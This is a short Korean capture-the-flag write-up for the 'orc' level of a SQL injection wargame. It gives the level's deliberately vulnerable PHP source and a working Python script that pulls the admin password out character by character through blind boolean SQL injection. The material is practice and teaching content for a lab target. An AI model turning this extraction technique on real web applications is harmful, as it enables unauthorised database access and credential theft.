## ORC Write-up

### 문제
``` php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

### Exploit 코드
``` python
import requests

url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
session = {'PHPSESSID':'My PHPSESSID'}
data = {}

flag=""

print("[∞] flag : ",end='')

for i in range(1,9):
   for j in range(32,127):
      data['pw']="' or id='admin' and ord(mid(pw,"+str(i)+",1))='"+str(j)+"'#"
      res = requests.get(url, params=data, cookies=session)
      if "Hello admin" in res.text:
         print(chr(j),end='')
         flag = flag + chr(j)
         break

data['pw']=flag
res = requests.get(url, params=data, cookies=session)

if "Clear!" in res.text:
   print("\n[♪] ORC Clear!")
```